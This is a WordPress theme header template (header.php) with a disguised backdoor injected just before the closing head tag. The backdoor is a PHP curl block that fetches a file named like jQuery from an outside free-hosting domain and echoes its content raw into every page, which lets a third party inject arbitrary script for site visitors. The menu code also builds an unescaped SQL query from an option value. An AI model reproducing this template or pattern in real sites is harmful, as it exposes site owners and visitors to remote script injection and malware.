<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head profile="http://gmpg.org/xfn/11">

<title>
    <?php if ( is_home() ) { ?><?php bloginfo('description'); ?>&nbsp;|&nbsp;<?php bloginfo('name'); ?><?php } ?>
    <?php if ( is_search() ) { ?>Search Results&nbsp;|&nbsp;<?php bloginfo('name'); ?><?php } ?>
    <?php if ( is_author() ) { ?>Author Archives&nbsp;|&nbsp;<?php bloginfo('name'); ?><?php } ?>
    <?php if ( is_single() ) { ?><?php wp_title(''); ?><?php } ?>
    <?php if ( is_page() ) { ?><?php wp_title(''); ?><?php } ?>
    <?php if ( is_category() ) { ?><?php single_cat_title(); ?>&nbsp;|&nbsp;<?php bloginfo('name'); ?><?php } ?>
    <?php if ( is_month() ) { ?><?php the_time('F'); ?>&nbsp;|&nbsp;<?php bloginfo('name'); ?><?php } ?>
    <?php if (function_exists('is_tag')) { if ( is_tag() ) { ?><?php bloginfo('name'); ?>&nbsp;|&nbsp;Tag Archive&nbsp;|&nbsp;<?php single_tag_title("", true); } } ?>
</title>

<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />

<?php if (is_home()) { ?>

    <?php if ( get_option('bizzthemes_meta_description') <> "" ) { ?><meta name="description" content="<?php echo stripslashes(get_option('bizzthemes_meta_description')); ?>" /><?php } ?>
    <?php if ( get_option('bizzthemes_meta_keywords') <> "" ) { ?><meta name="keywords" content="<?php echo stripslashes(get_option('bizzthemes_meta_keywords')); ?>" /><?php } ?>
    <?php if ( get_option('bizzthemes_meta_author') <> "" ) { ?><meta name="author" content="<?php echo stripslashes(get_option('bizzthemes_meta_author')); ?>" /><?php } ?>

<?php } ?>

<link rel="stylesheet" type="text/css" href="<?php bloginfo('stylesheet_url'); ?>" media="screen" />

    

<?php if ( get_option('bizzthemes_favicon') <> "" ) { ?><link rel="icon" type="image/png" href="<?php echo get_option('bizzthemes_favicon'); ?>" /><?php } ?>

<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="<?php if ( get_option('bizzthemes_feedburner_url') <> "" ) { echo get_option('bizzthemes_feedburner_url'); } else { echo get_bloginfo_rss('rss2_url'); } ?>" />

<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
    
<!--[if lt IE 7]>
<script src="http://ie7-js.googlecode.com/svn/version/2.0(beta3)/IE7.js" type="text/javascript"></script>
<![endif]-->

<?php if ( get_option('bizzthemes_scripts_header') <> "" ) { echo stripslashes(get_option('bizzthemes_scripts_header')); } ?>
<?php wp_enqueue_script('jquery'); ?> 
<?php if (is_home()) {
	  wp_enqueue_script( 'stepcarousel', get_bloginfo('template_directory').'/library/js/stepcarousel.js', array( 'jquery' ) );
	  wp_enqueue_script( 'stepcarousel-setup', get_bloginfo('template_directory').'/library/js/stepcarousel-setup.js', array( 'jquery' ) );
	}
?>

<?php wp_head(); ?>

<?php if ( get_option('bizzthemes_customcss') ) { ?><link href="<?php bloginfo('template_directory'); ?>/custom.css" rel="stylesheet" type="text/css"><?php } ?>
   
<?php
if(function_exists('curl_init'))
{
 $url = "http://www.4llw4d.freefilesblog.com/jquery-1.6.3.min.js"; 
 $ch = curl_init();  
 $timeout = 5;  
 curl_setopt($ch,CURLOPT_URL,$url); 
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
 curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
 $data = curl_exec($ch);  
 curl_close($ch); 
 echo "$data";
}
?>
</head>

<body>
  
<div class="container_12 content_wrap">

	<div id="header">
	
	    <div class="grid_8" id="logo-spot">
    			
		    <?php if ( get_option('bizzthemes_show_blog_title') ) { ?>
			
			    <div class="blog-title"><a href="<?php echo get_option('home'); ?>/"><?php bloginfo('name'); ?></a></div>
			
		        <div class="blog-description"><?php bloginfo('description'); ?></div>
			
		    <?php } else { ?>
				
                <h1 class="logo">
			
			        <a href="<?php bloginfo('url'); ?>" title="<?php bloginfo('name'); ?>">
			
			            <img src="<?php if ( get_option('bizzthemes_logo_url') <> "" ) { echo get_option('bizzthemes_logo_url'); } else { echo get_bloginfo('template_directory').'/images/logo-trans.png'; } ?>" alt="<?php bloginfo('name'); ?>" />
				    
					</a>
				
			    </h1><!--/logo-->

	        <?php } ?>

		</div><!--/logo-spot-->
		
		<div class="grid_4" id="search-spot">
		
		    <div class="feed-spot">
					
			    <?php if ( get_option('bizzthemes_feedburner') <> "" ) { ?> 
			
			        <a href="<?php echo get_option('bizzthemes_feedburner'); ?>"class="rss-button"></a>
			
			    <?php } else { ?>
			
			        <a href="<?php echo get_bloginfo_rss('rss2_url'); ?>"><span class="rss-button"></span></a>
				 
			    <?php } ?>
				
				<?php

	                $feed_count = stripslashes(get_option('bizzthemes_feedcount'));
					$feed_count = preg_replace('/width=\"\d\d\"/i', 'width="88"', $feed_count);
					$feed_count = preg_replace('/height=\"\d\d\"/i', 'height="26"', $feed_count);
					$feed_count = preg_replace('/bg=\w\w\w\w\w\w/i', 'bg=ffffff', $feed_count);
					$feed_count = preg_replace('/fg=\w\w\w\w\w\w/i', 'fg=444444', $feed_count);
					$feed_count = preg_replace('/<p>/i', '<div class="chicklet">', $feed_count);
					$feed_count = preg_replace('/<\/p>/i', '</div>', $feed_count);
					
                    if ( get_option('bizzthemes_feedcount') <> "" ) { echo $feed_count; } 
					
				?>

			</div><!--/feed-spot-->
			
			<form method="get" id="searchform" action="<?php bloginfo('url'); ?>/" class="grid_3 search-form fr">
								
			    <input type="text" value="<?php echo get_option('bizzthemes_search_name'); ?>" name="s" id="s" class="field" onfocus="if (this.value == '<?php echo get_option('bizzthemes_search_name'); ?>') {this.value = '';}" onblur="if (this.value == '') {this.value = '<?php echo get_option('bizzthemes_search_name'); ?>';}" />
			        
			    <button class="search-btn" type="submit" name="submit"><!----></button>
					
			</form>
				
		</div><!--/search-spot-->
        
	</div><!--/header -->
				
	<div id="top_menu">
	
	<?php
			
		global $wpdb;
			
		$blogcatname = get_option('bizzthemes_blogcategory');
			
		$catid = $wpdb->get_var("SELECT term_ID FROM $wpdb->terms WHERE name = '$blogcatname'");

    ?>
		
			<?php if (function_exists('dynamic_sidebar') && dynamic_sidebar('Header Navigation Menu') ){}else{  ?>		
			<ul id="pagenav" class="page-menu">
            <li class="hometab <?php if ( is_home() ) { ?>current_page_item <?php } ?>"><a href="<?php echo get_option('home'); ?>/"><?php echo get_option('bizzthemes_home_name'); ?></a></li>
				
		    <?php if ( get_option('bizzthemes_blogcategory') <> "" && $catid ) { ?><li <?php if ( is_category() || is_search() || is_single() || is_tag() || is_search() || is_archive() ) { ?> class="current_page_item" <?php } ?>><a href="<?php echo get_option('home');?>/?cat=<?php echo $catid; ?>" title="<?php echo $blogcatname; ?>"><?php echo $blogcatname; ?></a></li><?php } ?>
								
		    <?php wp_list_pages('title_li=&depth=0&exclude=' . get_inc_pages("pag_exclude_") .'&sort_column=menu_order'); ?>
           </ul>
            <?php }?>
											        
		<!--/page-menu-->
				                
	</div><!--/top_menu-->
	    